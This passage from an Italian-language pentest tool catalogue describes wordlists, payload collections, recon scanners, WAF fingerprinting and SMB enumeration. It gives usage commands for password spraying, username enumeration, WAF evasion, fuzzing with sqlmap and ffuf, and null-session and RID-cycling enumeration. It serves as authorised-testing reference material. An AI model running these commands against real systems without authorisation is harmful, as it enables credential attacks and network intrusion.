    detection)</li><li>Event ID 11 - File creation</li></ul><p>Config SwiftOnSecurity's
    sysmon-config è baseline standard.</p><h4 class=\"rt-red\">Considerazioni</h4><p><strong>PsExec
    detection:</strong> Crea service temporaneo PSEXESVC rilevabile da EDR, genera
    eventi 4697 (service installed), lascia artifacts in C:\\Windows\\.</p><p><strong>ProcMon
    performance:</strong> Può generare GB di log rapidamente, usare filtri aggressivi.</p><p><strong>Licensing:</strong>
    Gratuiti ma richiedono EULA acceptance, usare <code>-accepteula</code> per automation.</p>"
  best_in: false
  category_path: ["00_Common", "Tools_Windows"]
  notes:

- id: "wordlist-paroleitaliane"
  name: "Parole Italiane"
  version: ""
  icon: "../app/icons/github.svg"
  kind: "wordlist"
  phases: ["00_Common"]
  caps: ["italian-words", "mutation-base"]
  repo: "https://github.com/napolux/paroleitaliane"
  desc: "Dizionari italiani (nomi, cognomi, termini comuni) per password spraying
    e wordlist generation contestuale su target locali"
  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Parole Italiane</strong>
    è collezione dizionari lingua italiana ottimizzata per security testing su organizzazioni
    italiane. Include liste nomi propri, cognomi, città, termini comuni e pattern
    linguistici per generazione wordlist contestuali.</p><h4 class=\"rt-purple\">Contenuto</h4><p><strong>Nomi
    e cognomi:</strong> Database nomi italiani maschili/femminili e cognomi diffusi
    per username enumeration e generazione credenziali realistiche.</p><p><strong>Termini
    comuni:</strong> Parole quotidiane frequenti in password italiane (stagioni, mesi,
    città, squadre calcio).</p><p><strong>Pattern linguistici:</strong> Combinazioni
    tipiche italiane per mutation rules (suffissi, prefissi, sostituzioni carattere).</p><h4
    class=\"rt-green\">Casi d'uso</h4><p><strong>Password spraying:</strong> Generare
    wordlist probabili basate su cultura italiana: Roma2025!, Juventus123, Estate2024,
    Milano@2025</p><p><strong>Username enumeration:</strong> Combinare nomi/cognomi
    per username realistici: mario.rossi, m.rossi, rossi.mario, mrossi</p><p><strong>Mutation
    base:</strong> Usare parole italiane come base per rule-based mutations:<br><code>hashcat
    --stdout wordlist-ita.txt -r best64.rule</code></p><h4 class=\"rt-amber\">Integration
    con tool</h4><p><strong>CeWL custom wordlist:</strong></p><pre><code>cewl -d 2
    -m 5 --with-numbers -w custom-ita.txt https://target.it</code><br>Merge con parole
    italiane base.</p><p><strong>Username-anarchy:</strong><br><code>username-anarchy
    --input-file nominativi-ita.txt --select-format first.last > users.txt</code></pre><p><strong>Mentalist:</strong>
    Usare parole italiane in chain con anni, simboli, numeri comuni.</p><h4 class=\"\
    rt-red\">Best practice</h4><p>Combinare con OSINT target-specific (social media,
    LinkedIn), aggiungere pattern aziendali (nome_compagnia, slogan), includere varianti
    ortografiche e typo, testare suffissi numerici/simboli mandatori da policy. Liste
    curate per contesto specifico più efficaci di migliaia generiche: 50-200 password
    altamente probabili ottimali per spraying.</p>"
  best_in: false
  category_path: ["00_Common", "Wordlists"]
  notes:

- id: "wordlist-payloadsallthethings-4-2"
  name: "PayloadsAllTheThings"
  version: "4.2"
  icon: "../app/icons/github.svg"
  kind: "wordlist"
  phases: ["00_Common"]
  caps: ["payloads", "fuzzing", "bypass-techniques"]
  repo: "https://github.com/swisskyrepo/PayloadsAllTheThings"
  desc: "Collezione curata di payload, bypass e cheat-sheet per vulnerabilità web
    (injection, XSS, XXE, traversal) e fuzzing mirato"
  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>PayloadsAllTheThings</strong>
    è repository GitHub community-driven che aggrega payload, tecniche bypass e metodologie
    per exploitation vulnerabilità web. Organizzata per categoria, offre esempi pratici
    e cheat-sheet utilizzabili direttamente in testing. Include progetti correlati:
    InternalAllTheThings (AD/Internal Pentest) e HardwareAllTheThings (Hardware/IOT).</p><h4
    class=\"rt-purple\">Categorie principali</h4><p><strong>Injection:</strong> SQL
    Injection (MySQL, PostgreSQL, MSSQL, Oracle), NoSQL Injection (MongoDB, CouchDB),
    LDAP Injection, Command Injection (OS command separators), SSTI (Server-Side Template
    Injection)</p><p><strong>File-based:</strong> Path Traversal (bypass filters,
    encoding variations), File Upload (magic bytes, extension bypass, polyglot files),
    XXE (XML External Entity), File Inclusion (LFI/RFI)</p><p><strong>XSS:</strong>
    Reflected, Stored, DOM-based, bypass WAF, polyglot payloads, CSP bypass</p><p><strong>Deserialization:</strong>
    Java, PHP, Python, Ruby, .NET deserialization attacks</p><p><strong>Authentication:</strong>
    JWT attacks, OAuth bypass, SAML attacks, 2FA bypass</p><p><strong>Infrastructure:</strong>
    SSRF, XXE, CORS misconfiguration, subdomain takeover</p><h4 class=\"rt-green\"\
    >Struttura repository</h4><p>Ogni sezione contiene:</p><ul><li><strong>README.md</strong>
    - Descrizione vulnerabilità, exploitation methodology, payload multiple</li><li><strong>Intruder/</strong>
    - File set per Burp Intruder</li><li><strong>Images/</strong> - Screenshot e diagrammi</li><li><strong>Files/</strong>
    - File referenced nella documentazione</li></ul></p><p>Disponibile anche versione
    web navigabile: https://swisskyrepo.github.io/PayloadsAllTheThings/</p><h4 class=\"\
    rt-amber\">Utilizzo in testing</h4><p><strong>Fuzzing mirato:</strong> Usare payload
    specifici per vulnerability type in Burp Intruder, ffuf, o wfuzz.</p><p><strong>Bypass
    WAF:</strong> Testare encoding variations e obfuscation techniques per evasion.</p><p><strong>Cheat-sheet
    reference:</strong> Consultare durante exploitation per metodologie step-by-step.</p><p><strong>Remediation
    verification:</strong> Validare fix testando payload noti post-patching.</p><h4
    class=\"rt-red\">Best practice</h4><p>Repository costantemente aggiornato dalla
    community: star e pull per latest payloads. Combinare con scanner automatici (Nuclei,
    ZAP) per coverage completa. Personalizzare payload per target-specific context.
    Contribuire con nuovi bypass e tecniche via pull request seguendo CONTRIBUTING.md.
    Anti-virus potrebbe flaggare repository: whitelist path di download.</p>"
  best_in: false
  category_path: ["00_Common", "Wordlists"]
  notes:

- id: "wordlist-portswigger"
  name: "PortSwigger"
  version: ""
  icon: "../app/icons/github.svg"
  kind: "wordlist"
  phases: ["00_Common"]
  caps: ["burp-integration", "content-discovery", "intruder"]
  repo: "https://github.com/PortSwigger/wordlist-extractor"
  desc: "Wordlist e utility ecosistema Burp Suite per content discovery, fuzzing parametri
    e integration con Intruder/Extender"
  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>PortSwigger Wordlists</strong>
    è collezione utility e dizionari integrati nell'ecosistema Burp Suite. Include
    tool per estrarre/generare wordlist da asset applicazione target e alimentarli
    direttamente in Burp Intruder ed extensions.</p><h4 class=\"rt-purple\">Componenti</h4><p><strong>Wordlist
    Extractor:</strong> Tool per generare wordlist custom da:</p><ul><li>Response
    bodies di richieste Burp</li><li>JavaScript files e source maps</li><li>HTML comments
    e metadata</li><li>API responses e JSON structures</li></ul></p><p><strong>Built-in
    wordlists:</strong> Burp Suite include dizionari predefiniti per:</p><ul><li>Username/password
    common</li><li>Directories e filenames</li><li>Parameters fuzzing</li><li>Backup
    files extensions</li></ul></p><h4 class=\"rt-green\">Integration workflow</h4><p><strong>1.
    Estrazione context-aware:</strong> Durante proxy browsing, catturare richieste
    e usare wordlist extractor per generare dizionari basati su naming conventions
    osservate.</p><p><strong>2. Intruder payloads:</strong> Importare wordlist custom
    in Burp Intruder payload sets per fuzzing mirato di directories, parameters, headers.</p><p><strong>3.
    Content Discovery:</strong> Usare con Burp Scanner o Content Discovery extension
    per enumerazione endpoint nascosti.</p><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>API
    testing:</strong> Estrarre endpoint patterns da Swagger/OpenAPI documentation
    catturato in proxy.</p><p><strong>Parameter discovery:</strong> Generare lista
    parametri da JavaScript analysis per parameter pollution testing.</p><p><strong>Backup
    file hunting:</strong> Creare wordlist con extensions e suffixes comuni (.bak,
    .old, .backup) combinati con filename osservati.</p><h4 class=\"rt-red\">Best
    practice</h4><p>Combinare wordlist PortSwigger con SecLists per coverage estesa.
    Usare payload processing rules in Intruder per encoding/encryption on-the-fly.
    Salvare wordlist generate per riuso su target simili. Integrare con Turbo Intruder
    extension per high-speed fuzzing su wordlist grandi.</p>"
  best_in: false
  category_path: ["00_Common", "Wordlists"]
  notes:

- id: "wordlist-seclists-2025-2"
  name: "SecLists"
  version: "2025.2"
  icon: "../app/icons/github.svg"
  kind: "wordlist"
  phases: ["00_Common"]
  caps: ["user-passlists", "content-discovery", "fuzzing", "payloads"]
  repo: "https://github.com/danielmiessler/SecLists"
  desc: "Collezione OWASP di wordlist per pentest (user/pass, dir/file, fuzzing, pattern
    sensibili, web-shell) standard de-facto per discovery e testing"
  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>SecLists</strong> è
    la collezione definitiva di wordlist per security testing, maintained da Daniel
    Miessler, Jason Haddix e g0tmi1k. Aggreg a liste per username, password, URL,
    sensitive data patterns, fuzzing payloads, web shells e più. Obiettivo: fornire
    su ogni testing box accesso immediato a ogni tipo di lista necessaria.</p><h4
    class=\"rt-purple\">Categorie principali</h4><p><strong>Passwords:</strong><ul><li>Common-Credentials/
    - Default creds per dispositivi/applicazioni</li><li>Leaked-Databases/ - RockYou,
    LinkedIn leaks</li><li>Malware/ - Password usate da malware</li><li>Honeypot-Captures/
    - Credenziali da honeypot</li></ul></p><p><strong>Usernames:</strong> Names/ (top
    names by country), Honeypot-Captures/, xato-net-10-million-usernames.txt</p><p><strong>Discovery/Web-Content:</strong><ul><li>Common/
    - Directories e filenames comuni</li><li>CMS/ - Path specifici per WordPress,
    Joomla, Drupal</li><li>Raft/ - Comprehensive web content wordlists</li><li>Apache,
    IIS, Tomcat - Server-specific paths</li></ul></p><p><strong>Fuzzing:</strong><ul><li>SQLi/
    - SQL injection payloads</li><li>XSS/ - Cross-site scripting vectors</li><li>LFI/
    - Local file inclusion strings</li><li>XXE/ - XML external entity payloads</li><li>Command-Injection/
    - OS command separators</li></ul></p><p><strong>Pattern-Matching:</strong> Discovery/
    (API keys, credentials patterns), IOCs/, Regex/ (sensitive data detection)</p><p><strong>Miscellaneous:</strong>
    Web-Shells/ (shells collection), Payloads/ (various attack vectors), Protocols/
    (protocol-specific testing)</p><h4 class=\"rt-green\">Installazione</h4><p><strong>Git
    clone:</strong></p><pre><code>git clone --depth 1 https://github.com/danielmiessler/SecLists.git</code></pre><p><strong>Kali
    Linux:</strong></p><pre><code>apt -y install seclists</code> (in /usr/share/seclists)</p><p><strong>BlackArch:</strong><br><code>sudo
    pacman -S seclists</code></pre><h4 class=\"rt-amber\">Utilizzo tipico</h4><p><strong>Directory
    brute forcing:</strong></p><pre><code>ffuf -w SecLists/Discovery/Web-Content/raft-medium-directories.txt
    -u https://target/FUZZ</code></pre><p><strong>Username enumeration:</strong></p><pre><code>kerbrute
    userenum -d acme.local SecLists/Usernames/xato-net-10-million-usernames.txt</code></pre><p><strong>Password
    spraying:</strong></p><pre><code>crackmapexec smb targets.txt -u users.txt -p
    SecLists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt</code></pre><p><strong>Fuzzing
    XSS:</strong></p><pre><code>wfuzz -w SecLists/Fuzzing/XSS/XSS-Jhaddix.txt -u \"\
    https://target?param=FUZZ\"</code></pre><h4 class=\"rt-red\">Avvisi importanti</h4><p>Download
    causa false-positive anti-virus/anti-malware: whitelist filepath. Niente in SecLists
    danneggia computer as-is, ma non raccomandato storage su server production per
    rischio local file include. Repository aggiornato regolarmente: pull latest prima
    di engagement. Licenza MIT. Dimensione repository completo ~1.3GB.</p>"
  best_in: false
  category_path: ["00_Common", "Wordlists"]
  notes:

- id: "subbrute-77"
  name: "subbrute-77"
  version: ""
  icon: "../app/icons/github.svg"
  kind: "tool"
  phases: ["01_Information_Gathering"]
  caps: ["dns-bruteforce", "subdomain-enum", "resolver-rotation", "wildcard-detection"]
  repo: "https://github.com/TheRook/subbrute"
  desc: "Brute forcer DNS per subdomain enumeration usando open resolvers, con wildcard
    detection e caching per bypass rate-limit"
  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>SubBrute</strong> è
    subdomain brute-forcer che sfrutta open resolvers come proxy DNS per evitare rate-limit
    dei nameserver target e rilevare wildcard DNS. Interroga resolver pubblici invece
    che nameserver diretti, espandendo rapidamente superficie attack prima di tecniche
    passive.</p><h4 class=\"rt-purple\">Funzionamento</h4><p>SubBrute distribuisce
    query DNS su lista di open resolvers pubblici (Google DNS, OpenDNS, etc.), evitando
    di colpire direttamente authoritative nameserver del dominio target. Implementa:</p><ul><li><strong>Wildcard
    detection:</strong> Identifica record wildcard (*. domain) che causano false positive</li><li><strong>Resolver
    rotation:</strong> Ruota tra resolver multipli per evitare throttling individuale</li><li><strong>Caching
    awareness:</strong> Gestisce cached responses per accuracy</li><li><strong>Concurrent
    queries:</strong> Threading per velocità</li></ul></p><h4 class=\"rt-green\">Utilizzo</h4><p><strong>Basic
    scan:</strong></p><pre><code>python subbrute.py target.com</code></pre><p><strong>Custom
    wordlist:</strong></p><pre><code>python subbrute.py -s names.txt target.com</code></pre><p><strong>Custom
    resolvers:</strong></p><pre><code>python subbrute.py -r resolvers.txt target.com</code></pre><p><strong>Output
    to file:</strong></p><pre><code>python subbrute.py target.com -o subdomains.txt</code></pre><p><strong>Verbose
    mode:</strong></p><pre><code>python subbrute.py -v target.com</code></pre><h4
    class=\"rt-amber\">Workflow completo</h4><p><strong>1. Preparation:</strong> Verificare
    resolvers.txt contiene resolver validi e aggiornati. Usare liste come names.txt
    (8K+ common subdomains) o all.txt (200K+) in base a scope.</p><p><strong>2. Execution:</strong>
    Lanciare SubBrute con concurrency appropriata per network.</p><p><strong>3. Deduplication:</strong>
    Rimuovere duplicati e wildcard false positive dall'output.</p><p><strong>4. Integration:</strong>
    Alimentare risultati a massdns/dnsx per validation e a httpx/aquatone per screenshot.</p><h4
    class=\"rt-red\">Limitazioni e alternative</h4><p>SubBrute è older tool, alternatives
    moderne includono:</p><ul><li><strong>massdns:</strong> Più veloce, gestisce milioni
    query/sec</li><li><strong>puredns:</strong> Combina bruteforcing con wildcard
    filtering avanzato</li><li><strong>shuffledns:</strong> Massdns wrapper con features
    aggiuntive</li></ul><p>Tuttavia SubBrute rimane valido per scenario con rate-limit
    aggressivo grazie a resolver distribution. Best practice: combinare SubBrute (active)
    con Amass/Subfinder (passive) per coverage completa subdomain discovery.</p>"
  best_in: true
  category_path: ["01_Information_Gathering", "01_Recon", "Infrastructure", "DNS_Subdomains"]
  notes:

- id: "dirsearch"
  name: "dirsearch"
  version: "0.4.3"
  icon: "../app/icons/github.svg"
  kind: "tool"
  phases: ["01_Information_Gathering"]
  caps: ["content-discovery", "bruteforce-dirs", "wordlists", "extensions", "resume",
    "proxy"]
  repo: "https://github.com/maurosoria/dirsearch"
  desc: "Web path scanner per directory/file nascosti con filtri status/lunghezza,
    gestione estensioni, resume e proxy support"
  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>dirsearch</strong> è
    web path scanner avanzato per directory e file bruteforcing. Ottimizzato per grandi
    superfici con threading performante, rate control, autenticazione, proxy support
    e resume capability. Filtri intelligenti su status code, content length e regex
    riducono false positive.</p><h4 class=\"rt-purple\">Funzionalità chiave</h4><p><strong>Multi-threading:</strong>
    Concurrent requests per velocità con rate limiting configurabile.</p><p><strong>Extensions:</strong>
    Test multiple estensioni per file (php, asp, jsp, txt, bak) in single pass.</p><p><strong>Recursion:</strong>
    Follow discovered directories automaticamente con depth control.</p><p><strong>Filters:</strong><ul><li>Status
    codes (exclude 404, include specific)</li><li>Content length ranges</li><li>Regex
    patterns su response body</li><li>Response time thresholds</li></ul></p><p><strong>Authentication:</strong>
    Support per Basic, Digest, Bearer, NTLM auth.</p><p><strong>Proxy:</strong> HTTP/HTTPS/SOCKS
    proxy per routing traffic.</p><p><strong>Resume:</strong> Session management per
    continue interrupted scans.</p><p><strong>Output:</strong> Plain, JSON, XML, Markdown
    formats.</p><h4 class=\"rt-green\">Esempi utilizzo</h4><p><strong>Basic scan:</strong></p><pre><code>dirsearch
    -u https://target.com</code></pre><p><strong>Con wordlist custom:</strong></p><pre><code>dirsearch
    -u https://target.com -w /path/wordlist.txt</code></pre><p><strong>Multiple extensions:</strong></p><pre><code>dirsearch
    -u https://target.com -e php,asp,jsp,html</code></pre><p><strong>Exclude status
    codes:</strong></p><pre><code>dirsearch -u https://target.com --exclude-status
    404,403,500</code></pre><p><strong>Recursive scan:</strong></p><pre><code>dirsearch
    -u https://target.com -e php --recursion --recursion-depth 3</code></pre><p><strong>Con
    autenticazione:</strong></p><pre><code>dirsearch -u https://target.com -H \"Authorization:
    Bearer token\"</code></pre><p><strong>Rate limiting:</strong></p><pre><code>dirsearch
    -u https://target.com --delay 0.5 --max-rate 10</code></pre><p><strong>Save output:</strong></p><pre><code>dirsearch
    -u https://target.com -o output.txt --format plain</code></pre><h4 class=\"rt-amber\"\
    >Best practice</h4><p>Usare user-agent randomization per evitare blocking: <code>--random-agent</code>.
    Limitare concurrency su server fragili: <code>-t 10</code>. Per large scans, enable
    resume: <code>--session-file scan.session</code>. Salvare results e fare diff
    tra run successive per change detection. Combinare con content analysis (grep
    interessanti keywords in responses).</p><h4 class=\"rt-red\">Considerazioni operative</h4><p>Dirsearch
    genera traffico HTTP significativo rilevabile da WAF/IDS. Usare proxy per IP rotation
    se necessario. Rispettare rate-limit e robots.txt quando appropriato. False positive
    comuni su CMS con URL rewriting: validare manualmente finding interessanti. Per
    API testing, considerare extension-less scanning con wordlist API-specific.</p>"
  best_in: true
  category_path: ["01_Information_Gathering", "01_Recon", "Web", "Content_Discovery"]
  notes:

- id: "aquatone-linux-amd64"
  name: "aquatone_linux_amd64"
  version: "1.7.0"
  icon: "../app/icons/github.svg"
  kind: "tool"
  phases: ["01_Information_Gathering"]
  caps: ["visual-recon", "screenshotting", "html-report", "host-triage"]
  repo: "https://github.com/michenriksen/aquatone"
  desc: "Tool visual recon per screenshot massivi di servizi web con report HTML navigabile
    e triage rapido per host/porta grouping"
  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Aquatone</strong> fornisce
    'flyover' visuale dell'attack surface HTTP/HTTPS: riceve lista host (pipe da amass/subfinder/katana),
    sonda porte HTTP note, cattura screenshot headless, titoli, status, header e genera
    report HTML navigabili. Essenziale in information gathering per prioritizzare
    target interessanti prima di fuzzing/exploit.</p><h4 class=\"rt-purple\">Funzionalità</h4><p><strong>Discovery:</strong>
    Probe porte HTTP/HTTPS comuni e custom su lista host.</p><p><strong>Screenshot:</strong>
    Rendering headless con Chrome per cattura visuale pagine.</p><p><strong>Metadata
    extraction:</strong><ul><li>Page titles</li><li>HTTP status codes</li><li>Response
    headers (Server, X-Powered-By, etc.)</li><li>Response sizes</li><li>Technologies
    detected</li></ul></p><p><strong>Report HTML:</strong> Dashboard interattivo con:</p><ul><li>Screenshot
    grid view</li><li>Filtering per status/tecnologia</li><li>Host/port grouping</li><li>Quick
    access link a live URLs</li></ul></p><h4 class=\"rt-green\">Workflow tipico</h4><p><strong>1.
    Subdomain enum:</strong></p><pre><code>amass enum -d target.com | tee subs.txt</code></pre><p><strong>2.
    Aquatone scan:</strong></p><pre><code>cat subs.txt | aquatone -ports xlarge</code></pre><p><strong>Con
    porte custom:</strong></p><pre><code>cat hosts.txt | aquatone -ports 80,443,8080,8443,3000</code></pre><p><strong>Thread
    control:</strong></p><pre><code>cat hosts.txt | aquatone -threads 5</code></pre><p><strong>Screenshot
    resolution:</strong></p><pre><code>cat hosts.txt | aquatone -screenshot-width
    1440 -screenshot-height 900</code></pre><p><strong>Output directory:</strong></p><pre><code>cat
    hosts.txt | aquatone -out ./aquatone-results</code></pre><h4 class=\"rt-amber\"\
    >Port presets</h4><p>Aquatone include port presets:</p><ul><li><strong>small:</strong>
    80, 443</li><li><strong>medium:</strong> 80, 443, 8000, 8080, 8443</li><li><strong>large:</strong>
    80, 81, 443, 591, 2082, 2087, 2095, 2096, 3000, 8000, 8001, 8008, 8080, 8083,
    8443, 8834, 8888</li><li><strong>xlarge:</strong> 80-90, 443, 832, 981, 1010,
    1311, 2082, 2087, 2095, 2096, 2480, 3000, 3128, 3333, 4243, 4567, 4711, 4712,
    4993, 5000, 5104, 5108, 5800, 6543, 7000, 7396, 7474, 8000, 8001, 8008, 8014,
    8042, 8069, 8080-8100, 8161, 8172, 8181, 8200, 8222, 8243, 8280, 8281, 8333, 8337,
    8443, 8500, 8834, 8880, 8888, 8983, 9000, 9001, 9043, 9060, 9080, 9090, 9091,
    9200, 9443, 9800, 9981, 10000, 12443, 16080, 18091, 18092, 20720, 55672</li></ul></p><h4
    class=\"rt-red\">Tips operativi</h4><p>Normalizzare input a formato FQDN o IP:porta.
    Aquatone richiede Chrome/Chromium installato per screenshot. Su large scale (migliaia
    di host), considerare rate limiting e parallelizzare con GNU parallel. Report
    HTML può diventare pesante: segmentare scan per subnet o scope. Integrare con
    crawler (katana, gospider) post-triage per deep discovery sugli interessanti identificati.</p>"
  best_in: true
  category_path: ["01_Information_Gathering", "01_Recon", "Web", "Fingerprinting",
    "Visual_Recon"]
  notes:

- id: "whatwaf-1-9"
  name: "WhatWaf"
  version: "1.9"
  icon: "../app/icons/github.svg"
  kind: "tool"
  phases: ["01_Information_Gathering"]
  caps: ["waf-detection", "waf-fingerprint", "bypass-tips"]
  repo: "https://github.com/Ekultek/WhatWaf"
  desc: "Fingerprint dei WAF tramite pattern di header/redirect/pagine di blocco con
    suggerimenti di tuning. Guida l'adattamento di fuzzing/exploitation per ridurre
    i blocchi applicativi."
  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p>WhatWaf effettua fingerprinting
    di Web Application Firewall analizzando header, firme e comportamenti, e propone
    payload/trasformazioni per aggirare filtri comuni. Si usa in 'pre-exploitation'
    per calibrare fuzzing e tuning di strumenti. Riconosce 70+ WAF tra cui Cloudflare,
    Akamai, AWS WAF, Imperva, F5, Barracuda, ModSecurity, Sucuri, Wordfence e altri.</p><h4
    class=\"rt-purple\">Metodi detection</h4><p><strong>HTTP Headers:</strong> Analizza
    header distintivi (X-CDN, X-WAF, Server) che rivelano presenza WAF/CDN specifici.</p><p><strong>Response
    patterns:</strong> Confronta body di block page con signature database di WAF
    noti.</p><p><strong>Behavioral analysis:</strong> Testa response a payload deliberatamente
    malevoli per identificare pattern di blocking.</p><p><strong>Cookie fingerprinting:</strong>
    Analizza cookie caratteristici (es. __cfduid per Cloudflare).</p><h4 class=\"\
    rt-green\">Utilizzo</h4><p><strong>Basic detection:</strong></p><pre><code>python3
    whatwaf.py -u https://target.com</code></pre><p><strong>Con payload test:</strong></p><pre><code>whatwaf.py
    -u https://target.com --pa</code></pre><p><strong>Verbose output:</strong></p><pre><code>whatwaf.py
    -u https://target.com -v</code></pre><p><strong>Test bypass suggestions:</strong></p><pre><code>whatwaf.py
    -u https://target.com --tb</code></pre><p><strong>Proxy support:</strong></p><pre><code>whatwaf.py
    -u https://target.com --proxy http://127.0.0.1:8080</code></pre><p><strong>Batch
    scan:</strong></p><pre><code>whatwaf.py --fi targets.txt</code></pre><h4 class=\"\
    rt-amber\">Best practice</h4><p>Usare come triage rapido prima di fuzzing pesante.
    Validare risultati contro più endpoint dell'applicazione. Evitare flooding su
    target production. Registrare vettori che superano WAF per reportistica. Integrare
    findings con tool di bypass payload (PayloadsAllTheThings).</p><h4 class=\"rt-red\"\
    >Note operative</h4><p>Tool non sempre aggiornato con ultimi WAF/versioni. False
    negative possibili su WAF custom o configurazioni non standard. Complementare
    con test manuali e fuzzing controllato. Output bypass suggestions sono punto di
    partenza, non garanzia di successo.</p>"
  best_in: true
  category_path: ["01_Information_Gathering", "01_Recon", "Web", "Fingerprinting",
    "WAF"]
  notes:

- id: "paramspider"
  name: "paramspider"
  version: "1.0.1"
  icon: "../app/icons/github.svg"
  kind: "tool"
  phases: ["01_Information_Gathering"]
  caps: ["params-discovery", "wayback-mining", "scope-filtering", "ext-exclusion"]
  repo: "https://github.com/devanshbatham/ParamSpider"
  desc: "Tool per estrazione URL/parametri da archivi web (Wayback Machine) con scope
    filtering e exclusion list per fuzzing preparation"
  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>ParamSpider</strong>
    raccoglie URL parametrizzati da archivi web (Wayback Machine) e fonti pubbliche
    senza toccare target diretto. Filtra con extension exclusion e regex per produrre
    liste pulite pronte per fuzzing mirato (XSS/SQLi/SSRF). Essenziale in information
    gathering e attack surface mapping.</p><h4 class=\"rt-purple\">Fonti dati</h4><p><strong>Wayback
    Machine:</strong> Archive.org historical snapshots di URLs.</p><p><strong>CommonCrawl:</strong>
    Open repository di web crawl data.</p><p><strong>OTX AlienVault:</strong> Threat
    intelligence URL feeds.</p><p>Vantaggio: raccolta completamente passiva, non genera
    traffico verso target.</p><h4 class=\"rt-green\">Utilizzo</h4><p><strong>Basic
    domain scan:</strong></p><pre><code>python3 paramspider.py -d target.com</code></pre><p><strong>Include
    subdomains:</strong></p><pre><code>paramspider.py -d target.com --subs</code></pre><p><strong>Exclude
    extensions:</strong></p><pre><code>paramspider.py -d target.com --exclude jpg,png,gif,css,js</code></pre><p><strong>Output
    to file:</strong></p><pre><code>paramspider.py -d target.com -o params.txt</code></pre><p><strong>Placeholder
    per fuzzing:</strong></p><pre><code>paramspider.py -d target.com --placeholder
    FUZZ</code><br>Output: https://target.com/page?param=FUZZ</p><p><strong>Level
    control (subdomain depth):</strong></p><pre><code>paramspider.py -d target.com
    --level 3</code></pre><h4 class=\"rt-amber\">Workflow completo</h4><p><strong>1.
    Estrazione parametri:</strong></p><pre><code>paramspider.py -d target.com --subs
    -o raw-params.txt</code></pre><p><strong>2. Deduplication:</strong></p><pre><code>sort
    -u raw-params.txt > unique-params.txt</code></pre><p><strong>3. Fuzzing XSS:</strong></p><pre><code>cat
    unique-params.txt | gf xss | kxss</code></pre><p><strong>4. SQL injection:</strong></p><pre><code>cat
    unique-params.txt | sqlmap --batch --level 2</code></pre><p><strong>5. SSRF testing:</strong></p><pre><code>cat
    unique-params.txt | gf ssrf | ffuf -w - -u FUZZ</code></pre><h4 class=\"rt-red\"\
    >Integration con tool</h4><p><strong>Nuclei:</strong> <code>nuclei -l params.txt
    -t fuzzing-templates/</code></pre><p><strong>Arjun:</strong> <code>arjun -i params.txt</code>
    per parameter discovery addizionale</p><p><strong>GF patterns:</strong> <code>cat
    params.txt | gf redirect</code> per filtering parameter types</p><p><strong>httpx
    validation:</strong> <code>cat params.txt | httpx -mc 200</code> per verificare
    URLs ancora attivi</p><p>Note: URLs da Wayback possono essere obsoleti. Validare
    con httpx prima di fuzzing pesante. Rispettare robots.txt e terms of service di
    archivi web. ParamSpider output contiene potenzialmente sensitive info: proteggere
    file results appropriatamente.</p>"
  best_in: true
  category_path: ["01_Information_Gathering", "01_Recon", "Web", "Params_Discovery"]
  notes:

- id: "smb-enum"
  name: "SMB-enum"
  version: ""
  icon: "../app/icons/github.svg"
  kind: "tool"
  phases: ["01_Information_Gathering"]
  caps: ["smb-enum", "shares", "null-session", "rid-cycling"]
  repo: ""
  desc: "Raccolta tecniche/utility per enumerazione SMB (shares, permessi, null session,
    RID cycling) e identificazione misconfiguration"
  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>SMB-enum</strong> è
    percorso operativo che integra tool standard per enumerazione completa di SMB:
    Nmap NSE, rpcclient, smbclient, smbmap, enum4linux-ng. Obiettivo: identificare
    condivisioni accessibili, permessi deboli, null session, RID cycling per enumerazione
    utenti/gruppi e misconfigurazioni ACL prima di lateral movement.</p><h4 class=\"\
    rt-purple\">Tool e tecniche</h4><p><strong>Nmap NSE scripts:</strong><ul><li><code>smb-enum-shares</code>
    - Enumera shares e permessi</li><li><code>smb-enum-users</code> - Lista utenti
    via RPC</li><li><code>smb-enum-domains</code> - Domain/workgroup info</li><li><code>smb-enum-groups</code>
    - Groups enumeration</li><li><code>smb-enum-processes</code> - Running processes</li><li><code>smb-enum-sessions</code>
    - Active sessions</li><li><code>smb-os-discovery</code> - OS detection</li><li><code>smb-security-mode</code>
    - SMB signing status</li></ul></p><p><strong>rpcclient:</strong> MS-RPC client
    per query:</p><ul><li><code>enumdomusers</code> - Enum domain users</li><li><code>enumdomgroups</code>
    - Enum domain groups</li><li><code>queryuser &lt;RID&gt;</code> - User info by
    RID</li><li><code>querygroupmem &lt;RID&gt;</code> - Group membership</li><li><code>lsaenumsid</code>
    - Enumerate SIDs</li></ul></p><p><strong>smbclient:</strong> List/access shares:<br><code>smbclient
    -L //target -N</code> (null session)<br><code>smbclient //target/share -U username</code></p><p><strong>smbmap:</strong>
    Permissions mapping:<br><code>smbmap -H target</code><br><code>smbmap -H target
    -u username -p password</code><br><code>smbmap -H target -R share</code> (recursive
    listing)</p><p><strong>enum4linux-ng:</strong> All-in-one enumerator:<br><code>enum4linux-ng
    -A target</code><br>Output: JSON/YAML/YAML structured</p><h4 class=\"rt-green\"\
    >Workflow completo</h4><p><strong>1. Null session test:</strong></p><pre><code>rpcclient
    -U \"\" -N target</code><br><code>smbclient -L //target -N</code></pre><p><strong>2.
    Share enumeration:</strong></p><pre><code>nmap -p445 --script smb-enum-shares
    target</code><br><code>smbmap -H target -u guest -p \"\"</code></pre><p><strong>3.
    RID cycling:</strong></p><pre><code>rpcclient -U \"\" -N target</code><br><code>rpcclient
    $> lookupsids S-1-5-21-domain-500</code><br>Cycle through RID 500-2000 per user
    enumeration</p><p><strong>4. Permission audit:</strong><br><code>smbmap -H target
    -u user -p pass -R</code><br>Identificare writeable shares</p><p><strong>5. Comprehensive
    scan:</strong><br><code>enum4linux-ng -A -C target -oJ output.json</code></pre><h4
    class=\"rt-amber\">Misconfiguration comuni</h4><p><strong>Null session enabled:</strong>
    Anonymous access a IPC$ permette info disclosure.</p><p><strong>SMB signing disabled:</strong>
